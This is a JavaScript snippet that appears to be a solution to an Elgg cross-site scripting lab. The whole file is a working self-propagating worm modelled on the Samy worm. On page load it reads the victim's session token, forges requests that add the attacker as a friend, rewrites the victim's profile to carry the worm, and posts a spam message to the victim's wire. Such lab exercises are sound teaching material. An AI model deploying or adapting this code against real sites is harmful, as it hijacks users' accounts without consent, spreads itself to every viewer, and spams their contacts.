<script type="text/javascript" id="worm">
	window.onload = function(){
		//self propagation code
		var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
		var jsCode = document.getElementById("worm").innerHTML;
		var tailTag = "</" + "script>";
		var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);



		//Got from browser inspect element --> Network --> Params --> Form Data --> guid
		var samy_guid = 47;
		//current user guid got from printing elgg object
		var current_user_guid = elgg.session.user.guid;



		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		var name = "&name=" + elgg.session.user.username;
		var guid = "&guid=" + elgg.session.user.guid;

		//and Security Token __elgg_token
		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

		var briefDescription = "&briefdescription=1605084" + "&accesslevel[briefdescription]=1";
		var contactEmail = "&contactemail=samyhacker@gmail.com" + "&accesslevel[contactemail]=1";
		var description = "&description=" + wormCode + "&accesslevel[description]=1";
		var interests = "&interests=Hacking" + "&accesslevel[interests]=1";
		var location = "&location=Dhaka" + "&accesslevel[location]=1";
		var mobile = "&mobile=11111" + "&accesslevel[mobile]=1";
		var phone = "&phone=999999" + "&accesslevel[phone]=1";
		var skills = "&skills=Hacking" + "&accesslevel[skills]=1";
		var twitter = "&twitter=samy_tweets" + "&accesslevel[twitter]=1";
		var website = "&website=http://www.samy.hacker.com" + "&accesslevel[website]=1";

		


		//Construct the HTTP request to add Samy as a friend.
		var addFriendRouteWithSamy = "http://www.xsslabelgg.com/action/friends/add?friend="+samy_guid;
		var sendurlAddFriend = addFriendRouteWithSamy + ts + token + ts + token; 




		//Construct the content of POST request profile edit url.
	    var sendurlProfileEdit = "http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	    //checked POST request header of the profile/edit request and then concatenate accordingly using the syntax from there
		var contentProfileEdit = token + ts + name + description + briefDescription + location + interests + skills + contactEmail + phone + mobile + website + twitter + guid;


		//Construct the content of wire post url.
	    var sendurlWirePost = "http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
	    //checked POST request header of the profile/edit request and then concatenate accordingly using the syntax from there
	    var body = "&body=To earn 12 USD/hour(!), visit now http\://www.xsslabelgg.com/profile/" + elgg.session.user.name.toLowerCase();
		var contentWirePost = token + ts + body;



		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to add friend
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("GET",sendurlAddFriend,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send();	
		}

		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to modify profile
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurlProfileEdit,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(contentProfileEdit);
		}

		if(current_user_guid != samy_guid)
		{
			//Create and send Ajax request to post in wire
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurlWirePost,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(contentWirePost);
		}

	}
</script>
